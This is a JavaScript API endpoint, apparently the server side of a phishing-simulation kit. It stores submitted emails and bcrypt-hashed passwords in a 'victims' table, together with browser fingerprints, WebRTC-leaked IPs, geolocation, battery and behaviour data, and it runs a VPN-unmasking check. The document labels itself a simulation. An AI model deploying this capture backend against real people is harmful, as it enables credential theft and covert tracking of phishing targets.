/**
 * Capture API Endpoint
 *
 * Receives and stores victim data from phishing simulation
 *
 * POST /api/capture
 */

import bcrypt from 'bcryptjs';
import UAParser from 'ua-parser-js';
import crypto from 'crypto';
import { getSupabaseClient } from './_supabase.js';

// Rate limiting storage (in-memory, resets on cold start)
const rateLimitMap = new Map();
const RATE_LIMIT = 10; // requests per hour
const RATE_WINDOW = 60 * 60 * 1000; // 1 hour in ms

/**
 * Check rate limit for IP
 */
function checkRateLimit(ip) {
  const now = Date.now();

  if (!rateLimitMap.has(ip)) {
    rateLimitMap.set(ip, { count: 1, resetTime: now + RATE_WINDOW });
    return true;
  }

  const limit = rateLimitMap.get(ip);

  if (now > limit.resetTime) {
    rateLimitMap.set(ip, { count: 1, resetTime: now + RATE_WINDOW });
    return true;
  }

  if (limit.count >= RATE_LIMIT) return false;

  limit.count++;
  return true;
}

/**
 * Get client IP address from request
 */
function getClientIP(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    'unknown'
  );
}

/**
 * Parse User Agent string
 */
function parseUserAgent(userAgent) {
  const parser = new UAParser(userAgent);
  const result = parser.getResult();

  return {
    browser: {
      name: result.browser.name || 'Unknown',
      version: result.browser.version || 'Unknown',
    },
    os: {
      name: result.os.name || 'Unknown',
      version: result.os.version || 'Unknown',
      platform: result.os.name || 'Unknown',
    },
  };
}

/**
 * Get geolocation from IP address
 */
async function getLocationFromIP(ip) {
  if (
    ip === 'unknown' ||
    ip.startsWith('192.168.') ||
    ip.startsWith('10.') ||
    ip === '::1' ||
    ip === '127.0.0.1'
  ) {
    return {
      ip,
      city: 'Local',
      country: 'XX',
      country_name: 'Local Network',
      region: 'Local',
      timezone: 'UTC',
      latitude: 0,
      longitude: 0,
      isp: 'Local',
      source: 'local',
    };
  }

  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    if (response.ok) {
      const data = await response.json();
      return {
        ip: data.ip,
        city: data.city || 'Unknown',
        country: data.country_code || 'XX',
        country_name: data.country_name || 'Unknown',
        region: data.region || 'Unknown',
        timezone: data.timezone || 'UTC',
        latitude: data.latitude || 0,
        longitude: data.longitude || 0,
        isp: data.org || 'Unknown',
        postal: data.postal || '',
        source: 'ipapi',
      };
    }

    // Fallback
    const fallbackResponse = await fetch(`http://ip-api.com/json/${ip}`);
    if (fallbackResponse.ok) {
      const data = await fallbackResponse.json();
      return {
        ip,
        city: data.city || 'Unknown',
        country: data.countryCode || 'XX',
        country_name: data.country || 'Unknown',
        region: data.regionName || 'Unknown',
        timezone: data.timezone || 'UTC',
        latitude: data.lat || 0,
        longitude: data.lon || 0,
        isp: data.isp || 'Unknown',
        postal: data.zip || '',
        source: 'ip-api',
      };
    }
  } catch (error) {
    console.error('Geolocation error:', error);
  }

  return {
    ip,
    city: 'Unknown',
    country: 'XX',
    country_name: 'Unknown',
    region: 'Unknown',
    timezone: 'UTC',
    latitude: 0,
    longitude: 0,
    isp: 'Unknown',
    source: 'fallback',
  };
}

/**
 * Generate unique fingerprint hash (SHA-256)
 */
function generateFingerprint(data) {
  const fingerprintData = [
    data.browser?.userAgent || '',
    data.screen?.resolution || '',
    data.screen?.colorDepth || '',
    data.device?.platform || '',
    data.timezoneInfo?.timezone || '',
    data.fingerprints?.canvas || '',
    data.fingerprints?.webgl?.renderer || '',
  ].join('|');

  return crypto.createHash('sha256').update(fingerprintData).digest('hex');
}

/**
 * Detect VPN usage
 */
function detectVPN(data, location) {
  const detection = {
    timezoneMismatch: false,
    webRTCLeak: false,
    suspiciousISP: false,
    likelyVPN: false,
    confidence: 'low',
  };

  if (data.timezoneInfo?.timezone && location.timezone) {
    detection.timezoneMismatch = data.timezoneInfo.timezone !== location.timezone;
  }

  if (data.webRTC?.publicIP && data.webRTC.publicIP !== location.ip) {
    detection.webRTCLeak = true;
  }

  const vpnKeywords = ['vpn', 'proxy', 'datacenter', 'cloud', 'hosting', 'virtual'];
  const isp = location.isp?.toLowerCase() || '';
  detection.suspiciousISP = vpnKeywords.some((k) => isp.includes(k));

  const indicators = [
    detection.timezoneMismatch,
    detection.webRTCLeak,
    detection.suspiciousISP,
  ].filter(Boolean).length;

  if (indicators >= 2) {
    detection.likelyVPN = true;
    detection.confidence = 'high';
  } else if (indicators === 1) {
    detection.confidence = 'medium';
  }

  return detection;
}

/**
 * Main handler
 */
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const clientIP = getClientIP(req);

    if (!checkRateLimit(clientIP)) {
      return res.status(429).json({
        error: 'Rate limit exceeded',
        message: 'Too many requests. Please try again later.',
      });
    }

    const data = req.body;
    const location = await getLocationFromIP(clientIP);
    const parsedUA = parseUserAgent(data.browser?.userAgent || req.headers['user-agent']);
    const fingerprint = generateFingerprint(data);
    const vpnDetection = detectVPN(data, location);

    let hashedPassword = null;
    if (data.metadata?.formData?.password) {
      hashedPassword = await bcrypt.hash(data.metadata.formData.password, 10);
    }

    // Prepare flat row for Supabase (JSONB columns for nested data)
    const victimRow = {
      fingerprint,
      timestamp: new Date().toISOString(),
      screen: data.screen || {},
      browser: { ...data.browser, ...parsedUA.browser },
      device: {
        ...data.device,
        isBot: /bot|crawler|spider/i.test(data.browser?.userAgent || ''),
      },
      os: parsedUA.os,
      network: { ...location, vpnDetection },
      timezone_info: data.timezoneInfo || {},
      fingerprints: data.fingerprints || {},
      geolocation: data.geolocation || null,
      web_rtc: data.webRTC || {},
      behavior: data.behavior || {},
      battery: data.battery || null,
      metadata: {
        userSubmitted: data.metadata?.userSubmitted || false,
        formData: {
          email: data.metadata?.formData?.email || null,
          password: hashedPassword,
        },
      },
    };

    const supabase = getSupabaseClient();

    // Upsert: insert new or update existing record by fingerprint
    const { data: result, error } = await supabase
      .from('victims')
      .upsert(victimRow, { onConflict: 'fingerprint' })
      .select('id')
      .single();

    if (error) throw error;

    return res.status(200).json({
      success: true,
      message: 'Data captured successfully',
      fingerprint,
      location: {
        city: location.city,
        country: location.country_name,
      },
      vpnDetection,
      id: result?.id,
    });
  } catch (error) {
    console.error('Capture error:', error);
    return res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
}
